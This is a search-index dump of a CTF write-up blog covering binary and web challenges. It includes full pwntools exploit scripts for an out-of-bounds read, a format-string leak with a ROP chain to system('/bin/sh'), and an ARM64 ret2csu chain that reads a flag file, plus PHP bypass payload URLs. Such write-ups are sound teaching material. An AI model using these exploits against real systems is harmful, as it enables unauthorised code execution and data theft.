[{"content":"","date":"8 November 2023","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"8 November 2023","permalink":"/","section":"d0UBleW's Blog","summary":"","title":"d0UBleW's Blog"},{"content":"","date":"8 November 2023","permalink":"/tags/format-string/","section":"Tags","summary":"","title":"format string"},{"content":" Initial Analysis # When we try to run the binary file, we are first prompted to enter a 4-digit password. Looking at the decompilation output, the password is hardcoded in password_checker() function, i.e., 1235\n__int64 __fastcall password_checker(int password) { __int64 result; // rax if ( password == 1235 ) { puts(\u0026#34;Login Successfully\\n\u0026#34;); result = 1LL; } else { if ( password \u0026lt;= 999 || password \u0026gt; 9999 ) puts(\u0026#34;Please Enter 4 digit numbers!\\n\u0026#34;); else puts(\u0026#34;Invalid password!\\n\u0026#34;); result = 0LL; } return result; } Next, we could see that inside management_system() function, we could see that we are allowed to query an item whose ID is less than or equal to 14. However, notice that there is no check for negative item ID and the variable data type is a signed integer.\nvoid __fastcall management_system() { int input; // [rsp+4h] [rbp-Ch] unsigned int j; // [rsp+8h] [rbp-8h] unsigned int i; // [rsp+Ch] [rbp-4h] while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { puts(\u0026#34;--- Welcome to the Management System ---\u0026#34;); puts(\u0026#34;1. User List \u0026#34;); puts(\u0026#34;2. Item List \u0026#34;); puts(\u0026#34;3. Search for Item Storage \u0026#34;); puts(\u0026#34;4. Exit\u0026#34;); printf(\u0026#34;Enter your choice: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;input); if ( input != 1 ) break; for ( i = 0; (int)i \u0026lt;= 17; ++i ) printf(\u0026#34;UserID - %d %s\\n\u0026#34;, i, userlist[i]); putchar(\u0026#39;\\n\u0026#39;); } if ( input != 2 ) break; for ( j = 0; (int)j \u0026lt;= 14; ++j ) printf(\u0026#34;ItemID - %d %s\\n\u0026#34;, j, item[2 * (int)j]); putchar(\u0026#39;\\n\u0026#39;); } if ( input != 3 ) break; printf(\u0026#34;Please Enter item ID: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;input); if ( input \u0026lt;= 14 ) printf(\u0026#34;\\nStorage of %s: %s\\n\\n\u0026#34;, item[2 * input], off_4888[2 * input]); else puts(\u0026#34;Invalid item ID!\\n\u0026#34;); } if ( input == 4 ) break; puts(\u0026#34;Invalid Input!\u0026#34;); } } This means that we could provide a negative item ID, e.g., -4, and it would access memory address lower than item and return the value there. Looking at interesting things that we could read with negative item ID, we could see that there is a variable named secret which contains the flag.\nSolution # Now that we know we could read the flag by providing a negative item ID, the next step is to calculate the exact value to properly access the flag. To do this, we could simply subtract the distance between item and secret and then divides the value by 16.\n#!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./vuln\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc localhost 1337\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: return process([elf.path] + argv, env=env, *a, **kw) env = {} io = start() item = elf.sym[\u0026#34;item\u0026#34;] secret = elf.sym[\u0026#34;secret\u0026#34;] delta = (item - secret) // 16 log.info(f\u0026#34;{delta=:#x}\u0026#34;) io.sendlineafter(b\u0026#34;numbers): \u0026#34;, b\u0026#34;1235\u0026#34;) io.sendlineafter(b\u0026#34;choice: \u0026#34;, b\u0026#34;3\u0026#34;) io.sendlineafter(b\u0026#34;ID: \u0026#34;, str(delta * -1).encode()) io.recvuntil(b\u0026#34;Storage of \u0026#34;) io.interactive() ","date":"8 November 2023","permalink":"/posts/pwc-hackaday-23/pwn/hack-the-binary-1/","section":"My Average Blog","summary":"Array OOB read","title":"Hack the Binary 1"},{"content":" Initial Analysis # The given binary file is almost similar to Hack the Binary 1, but without the flag lying around in the memory and array OOB. Instead, the login() function is now susceptible to format string attack. Furthermore, it is also subjected to buffer overflow as the scanf format is not restricted by length.\n__int64 login() { __int64 result; // rax char format; // [rsp+Ah] [rbp-6h] do { printf(\u0026#34;Please Enter Password (4 digit numbers): \u0026#34;); __isoc99_scanf(\u0026#34;%s\u0026#34;, \u0026amp;format); printf(\u0026#34;Your Password is \u0026#34;); printf(\u0026amp;format); // \u0026lt;=== format string !!! putchar(10); result = password_checker(\u0026amp;format); } while ( (_DWORD)result != 1 ); return result; } Solution # The first step is to leak the stack and look for any interesting address, particularly the one that points to libc memory space since we want to call system() later on to pop a shell. The format string that would be discussed in this writeup is %n$llx where n specify the stack offset and llx for 64-bit value in hex format.\n#!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./vuln2\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc localhost 1337\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: return process([elf.path] + argv, env=env, *a, **kw) env = {} def printf_leak(idx): payload = f\u0026#34;%{idx}$llx\u0026#34;.encode() io.sendline(payload) io.recvuntil(b\u0026#34;is \u0026#34;) leak = int(io.recvline(keepends=False), 16) return leak io = start() for i in range(1, 16): leak = printf_leak(i) log.info(f\u0026#34;{i} {leak:#x}\u0026#34;) io.interactive() Based on the result, the third entry is a libc address value.\nOne could also double check where is the libc memory region via /proc/\u0026lt;pid\u0026gt;/maps Since the challenge does not come with a libc file, we could not directly compute the offset between the leaked address with the base address of libc. The local libc used in this writeup is of version 2.35-0ubuntu3. Now, if we try to run it against the remote server, we could see that the lowest 3 nibbles (hex digit) is different (local is a37, remote is a77). We only compare the lowest 3 nibbles since ASLR does not affect these 3. This means that the remote server is using a different libc version.\nWe need to check if the leaked address belongs to any libc function such that we could use the known symbol as a lookup value on libc database like:\nhttps://libc.rip https://libc.blukat.me Now, if we attached gdb to the process (that is running local binary), we could see that the address lies within __GI___libc_write.\nIf we try to use the symbol name __GI___libc_write with the address 0xa37-23 = 0xa20, libc.rip returns us results. However, there is no 2.35-0ubuntu3. This means that the symbol name is not quite right.\nIf we try to break at the beginnning of the function, gef (gdb plugin) labels the function as write.\nNow, if we use replace the symbol name with write instead, we get more results and 2.35-0ubuntu3 is among them.\nNext, we just need to replace the address value with the one that we got from remote server, i.e., 0xa77-23 = 0xa60. If we diff the results between __GI___libc_write 0xa60 and write 0xa60, we could deduce that libc6_2.35-0ubuntu3.4_amd64 is probably the correct one. Click on the result and we could see various offsets, e.g., write, system, str_bin_sh, etc. With the offset of write, we could compute the libc base address on the remote side and then use the base address to locate system function address within the process memory and various other stuffs. Another thing that we need is also a pop rdi; ret; gadget which does not exist in the binary file, but is available from the libc file.\nFinal solve script:\n#!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./vuln2\u0026#34;, checksec=False) libc = ELF(\u0026#34;./libc.so.6\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc localhost 1337\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: return process([elf.path] + argv, env=env, *a, **kw) env = {} def printf_leak(idx): payload = f\u0026#34;%{idx}$llx\u0026#34;.encode() io.sendline(payload) io.recvuntil(b\u0026#34;is \u0026#34;) leak = int(io.recvline(keepends=False), 16) return leak io = start() # for i in range(1, 16): # leak = printf_leak(i) # log.info(f\u0026#34;{i} {leak:#x}\u0026#34;) libc_leak = printf_leak(3) libc.address = libc_leak - 0x114a60 - 23 log.info(f\u0026#34;{libc.address=:#x}\u0026#34;) pop_rdi = libc.address + 0x001bc0a1 ret = pop_rdi + 1 bin_sh = next(libc.search(b\u0026#34;/bin/sh\\x00\u0026#34;)) payload = b\u0026#34;A\u0026#34; * 6 payload += p64(elf.bss(0xc00)) payload += flat( pop_rdi, bin_sh, ret, # stack alignment libc.sym[\u0026#34;system\u0026#34;] ) io.sendline(payload) io.sendline(b\u0026#34;1235\u0026#34;) io.interactive() ","date":"8 November 2023","permalink":"/posts/pwc-hackaday-23/pwn/hack-the-binary-2/","section":"My Average Blog","summary":"Format string to defeat ASLR, ROP to get RCE","title":"Hack the Binary 2"},{"content":"Welcome to my average blog!\n","date":"8 November 2023","permalink":"/posts/","section":"My Average Blog","summary":"Welcome to my average blog!","title":"My Average Blog"},{"content":"","date":"8 November 2023","permalink":"/tags/oob/","section":"Tags","summary":"","title":"oob"},{"content":"","date":"8 November 2023","permalink":"/tags/php/","section":"Tags","summary":"","title":"php"},{"content":" Source Code # This is a rough overview of the source code but is enough for solving the challenge \u0026lt;?php include \u0026#39;flag.php\u0026#39;; if (isset($_GET[\u0026#39;debug\u0026#39;])) { highlight_file(__FILE__); } if (isset($_GET[\u0026#39;url\u0026#39;])) { $url = $_GET[\u0026#39;url\u0026#39;]; $parsed = parse_url($url); if ($parsed[\u0026#39;host\u0026#39;] == \u0026#34;www.google.com\u0026#34; \u0026amp;\u0026amp; ($parsed[\u0026#39;scheme\u0026#39;] == \u0026#34;http\u0026#34; || $parsed[\u0026#39;scheme\u0026#39;] == \u0026#34;https\u0026#34;)) { echo file_get_contents(str_replace(\u0026#34;../\u0026#34;, \u0026#34;/\u0026#34;, $url) . \u0026#34;?flag=\u0026#34; . $flag); } else { die(\u0026#34;Forbidden\u0026#34;); } } ?\u0026gt; Initial Analysis # From the source code above, we could see that it requires us to provide a URL that satisfy the criterias. Searching on the internet on how to bypass parse_url host leads us to this page.\nBased on the PoC, for PHP \u0026lt; 5.6.28, the parse_url incorrectly parses the host component. We could trick parse_url to think that www.google.com is the host, but in fact, the real host is a webhook for us to retrieve the flag. However, this does not work for us since if we look at the response header, it is stated that the server is running PHP version 8.2.12.\nSeems like there is no way for us to trick the parse_url but to work with www.google.com\nLooking at www.google.com # If we provide https://www.google.com as the url query value, we could see that it just returns the page with an empty search box.\nIf we go to google and try to search up, e.g., pwc hackaday 2023, it would redirect us to this URL: https://www.google.com/search?q=pwc+hackaday+2023\u0026amp;....\nNow, if we try to visit https://www.google.com/search?q=hello+world directly, we end up with this page.\nLooking back at the source code, we could see that the argument passed to file_get_contents is our provided url appended with ?flag=. If our provided url already contains ?foo=bar, then the appended ?flag= would lose its ? original syntax meaning and instead be treated as the continuation of our initial foo parameter key value, i.e., foo = bar?flag=\nSolution # Before we continue, let\u0026rsquo;s recap back on our findings:\nparse_url host confusion is not possible due to mismatch PHP version If our provided url already contains ? which signify the starting of query string, then the appended ?flag would lose its ? meaning The Google search endpoint /search query key q value is reflected back to the search box Now, putting everything together, we could provide url as https://www.google.com/search?q= and the flag would be appended into https://www.google.com/search?q=?flag=..., which means that ?flag=... would show up inside the Google search box.\n","date":"8 November 2023","permalink":"/posts/pwc-hackaday-23/web/php-code-review-1/","section":"My Average Blog","summary":"Leveraging Google search box to capture the flag","title":"PHP Code Review 1"},{"content":" Source Code # This is only a part of the source code \u0026lt;?php // php 8.2.12 // // if ?debug, highlight __FILE__ to view source code $username = $_GET[\u0026#39;username\u0026#39;]; $passwd = $_GET[\u0026#39;password\u0026#39;]; $alg = $_GET[\u0026#39;alg\u0026#39;]; $pwlist = array(\u0026#39;admin\u0026#39; =\u0026gt; \u0026#34;REMOVED\u0026#34;, \u0026#34;editor\u0026#34; =\u0026gt; \u0026#34;REMOVED\u0026#34; ); function hashing($passwd, $alg) { try { if (!isset($alg)) { $alg = \u0026#34;md5\u0026#34;; } $alg = strval(trim($alg)); $passwd = strval($passwd); if ($alg != \u0026#34;md5\u0026#34; \u0026amp;\u0026amp; $alg != \u0026#34;sha256\u0026#34;) { die(\u0026#34;invalid algorithm\u0026#34;); } return hash($alg, $passwd); } catch (Throwable) { return; } } if (isempty($username) || isempty($passwd)) { die(\u0026#34;empty username or password\u0026#34;); } if (!strcmp(hashing($passwd, $alg), $pwlist[$username])) { // set cookie with value of xor($username, $flag) } ?\u0026gt; Initial Analysis # From the source code above, it is apparent that we need to pass the strcmp checks, such that we could retrieve the flag from the cookie. The first argument is the hash digest of our provided password (MD5 or SHA256) and the second argument comes from the initialized array. Since the value of the array is not fully known, it is almost impossible for us to guess the username\u0026rsquo;s hashed password.\nHowever, notice that if we provide a username that does not exist in the array, $pwlist[$username] would just return NULL. Looking at the hashing() function, we could see that there are two code paths, one that returns hash($alg, $passwd), and another path that returns NULL. Since we could make the second argument to be NULL, it would be great if we could get the hashing() function to return NULL as well.\nAnalysis of hashing() # The code path which returns NULL, require us to trigger an error somewhere inside the try block. There are three function candidates, i.e., isset, strval, and trim. After trial-and-error, the trim() function would raise an error when an array is passed as the argument.\nWe could re-confirm this behaviour by passing an array to hashing() and observe that it indeed returns nothing as opposed to normal argument like md5 and sha256.\nSolution # Here is the summary of our findings:\nOur goal is to pass the strcmp checks We could make the second argument to return NULL using non-existing username We could make the first argument to return NULL by triggering an error via the trim() function by passing it an array such that the catch block is reached To pass an array via HTTP query string, we just need to append the parameter name with [], e.g., ?alg[]=abcd. Since the cookie value is our supplied username XOR with the flag and base64 encoded, and we do not know the length of the flag beforehand, we could just supply a really long username\nThe final payload to get the server to set the cookie is:\nhttp://\u0026lt;url\u0026gt;?username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026amp;password=deadbeef\u0026amp;alg[]= ","date":"8 November 2023","permalink":"/posts/pwc-hackaday-23/web/php-code-review-2/","section":"My Average Blog","summary":"Triggering error to reach \u003ccode\u003ecatch\u003c/code\u003e block","title":"PHP Code Review 2"},{"content":"","date":"8 November 2023","permalink":"/categories/pwc-ctf-hack-a-day-2023-securing-ai/","section":"Categories","summary":"","title":"PwC CTF: Hack A Day 2023 - Securing AI"},{"content":"","date":"8 November 2023","permalink":"/categories/pwn/","section":"Categories","summary":"","title":"pwn"},{"content":"","date":"8 November 2023","permalink":"/tags/rop/","section":"Tags","summary":"","title":"ROP"},{"content":"","date":"8 November 2023","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"8 November 2023","permalink":"/categories/web/","section":"Categories","summary":"","title":"web"},{"content":"","date":"25 July 2023","permalink":"/tags/arm64/","section":"Tags","summary":"","title":"ARM64"},{"content":" Work in progress. Note # Not sure why the exploit does not work in non-debug mode locally, but works for local debug-mode and remote non-debug aarch64 (ARM64) # Tools # References: https://docs.pwntools.com/en/stable/qemu.html\nDebugging (choose either one):\ngdb-multiarch: sudo apt-get install gdb-multiarch gcc toolchain (with gdb): https://github.com/xpack-dev-tools/aarch64-none-elf-gcc-xpack/ Running:\nqemu: sudo apt-get install qemu-user-static libs: sudo apt-get install libc6-arm64-cross installs to /usr/aarch64-linux-gnu/ Running the binary\n# non-debug mode qemu-aarch64-static ./binary # debug mode (gdbserver) on port 1234 qemu-aarch64-static -g 1234 ./binary # in case of the loader not provided (`ld-linux-aarch64.so.1`), use the loader from `libc-arm64-cross` qemu-aarch64-static -L /usr/aarch64-linux-gnu/ ./binary Attach debugger with GEF\ngefâž¤ gef-remote --qemu-user localhost 1234 Assembly # References: http://blog.perfect.blue/ROPing-on-Aarch64\nRegisters # x0 to x7 are used to pass arguments x29 is equivalent to rbp in x86 x30 stores return address Function Prologue # Pre-indexed performs the offset operation then the assembly instruction:\nAdd N to sp (sp = sp + N) Stores old frame pointer, x29, to [sp] and return address, x30, to [sp + 8] stp x29, x30, [sp, #N]! ; pre-indexed [base, #offset]! mov x29, sp Function Epilogue # Post-indexed performs the assembly instruction then the offset operation\nLoad [sp] to x29 and [sp + 8] to x30 Add N to sp (sp = sp + N) ldp x29, x30, [sp], #N ; post-indexed [base], #offset Stack Layout # +--------------------------+ ^ Lower memory address | callee\u0026#39;s saved x29 | | +--------------------------+ | | callee\u0026#39;s saved x30 | | +--------------------------+ | Stack growth direction | callee\u0026#39;s local variables | +--------------------------+ | caller\u0026#39;s saved x29 | +--------------------------+ | caller\u0026#39;s saved x30 | +--------------------------+ | caller\u0026#39;s local variables | +--------------------------+ Higher memory address Unlike in x86 where saved rbp and rip are below the local variables which allow us to overwrite the saved rip and immediately return to our desired address, in ARM64 we overwrite the callers\u0026rsquo;s return address instead due to the stack layout which means that we would first return normally to the caller and only then return to our desired address\nSolution # #!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * ld = ELF(\u0026#34;./ld-linux-aarch64.so.1\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) elf = context.binary = ELF(\u0026#34;./vuln\u0026#34;) def start(argv=[], *a, **kw): global flag_path host = args.HOST or \u0026#39;generic-rop-challenge.chal.imaginaryctf.org\u0026#39; port = int(args.PORT or 42042) if args.REMOTE: flag_path = b\u0026#34;/home/user/flag.txt\\x00\u0026#34; return remote(host, port) if args.GDB: flag_path = b\u0026#34;/run/shm/flag.txt\\x00\u0026#34; return process([qemu, \u0026#34;-g\u0026#34;, str(debug_port), elf.path]) else: flag_path = b\u0026#34;/run/shm/flag.txt\\x00\u0026#34; return process([qemu, elf.path] + argv, env=env, *a, **kw) env = {} qemu = \u0026#34;/usr/bin/qemu-aarch64-static\u0026#34; debug_port = 1234 flag_path = b\u0026#34;\u0026#34; io = start() pad = 80 - 0x10 main_x29 = b\u0026#34;BBBBBBBB\u0026#34; bss = elf.bss(0x200) csu_1 = 0x400948 csu_2 = 0x400928 def ret2csu(w0, x1, x2, func_ptr, next_gadget): payload = b\u0026#34;A\u0026#34; * pad + main_x29 + p64(csu_1) payload += flat(bss, p64(csu_2)) payload += flat(0, 1) # x19, x20 payload += flat(func_ptr, w0) # x21, x22 payload += flat(x1, x2) # x23, x24 payload += flat(bss, next_gadget) return payload # Leak LIBC payload = ret2csu(elf.got[\u0026#34;puts\u0026#34;], 0, 0, elf.got[\u0026#34;puts\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) leak_puts = u64(io.recvline(keepends=False).ljust(8, b\u0026#34;\\x00\u0026#34;)) if not args.REMOTE: leak_puts |= 0x4000000000 log.info(f\u0026#34;{leak_puts=:#x}\u0026#34;) libc.address = leak_puts - libc.symbols[\u0026#34;puts\u0026#34;] log.info(f\u0026#34;{libc.address=:#x}\u0026#34;) # gets(bss) // stdin: /home/user/flag.txt pause() log.info(f\u0026#34;setup flag path string @ bss + 0x500\u0026#34;) log.info(f\u0026#34;{flag_path=}\u0026#34;) flag_path_addr = elf.bss(0x500) payload = ret2csu(flag_path_addr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(flag_path) # absolute path to ignore `dirfd` for `openat` # gets(bss) // stdin: libc.symbols[\u0026#34;openat\u0026#34;] openat_fptr = elf.bss(0x600) log.info(f\u0026#34;setup openat function pointer @ bss + 0x600\u0026#34;) payload = ret2csu(openat_fptr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(p64(libc.symbols[\u0026#34;openat\u0026#34;])) # fini_ptr = 0x400e20 # openat(0, flag_path_addr, 0) log.info(f\u0026#34;openat(0, flag_path_addr, 0)\u0026#34;) payload = ret2csu(0, flag_path_addr, 0, openat_fptr, elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) # gets(bss) // stdin: libc.symbols[\u0026#34;read\u0026#34;] read_fptr = elf.bss(0x600) log.info(f\u0026#34;setup read function pointer @ bss + 0x600\u0026#34;) payload = ret2csu(read_fptr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(p64(libc.symbols[\u0026#34;read\u0026#34;])) # read(5, flag_addr, 0x100) flag_addr = elf.bss(0x700) log.info(f\u0026#34;read(5, flag_addr, 0x100)\u0026#34;) # trial-and-error to find the proper fd payload = ret2csu(5, flag_addr, 0x100, read_fptr, elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) # gets(bss) // stdin: libc.symbols[\u0026#34;write\u0026#34;] write_fptr = elf.bss(0x600) log.info(f\u0026#34;setup write function pointer @ bss + 0x600\u0026#34;) payload = ret2csu(write_fptr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(p64(libc.symbols[\u0026#34;write\u0026#34;])) # write(1, flag_addr, 0x100) payload = ret2csu(1, flag_addr, 0x100, write_fptr, elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.interactive() ","date":"25 July 2023","permalink":"/posts/imaginaryctf-2023/pwn/generic-rop-challenge/","section":"My Average Blog","summary":"ARM64 ROP with \u003ccode\u003eret2csu\u003c/code\u003e","title":"generic-rop-challenge"},{"content":"","date":"25 July 2023","permalink":"/categories/imaginaryctf-2023/","section":"Categories","summary":"","title":"ImaginaryCTF 2023"},{"content":"Trying to learn pwn and reversing.\n","date":"1 January 0001","permalink":"/about/","section":"d0UBleW's Blog","summary":"Trying to learn pwn and reversing.","title":"About"},{"content":"","date":"1 January 0001","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","permalink":"/series/","section":"Series","summary":"","title":"Series"}]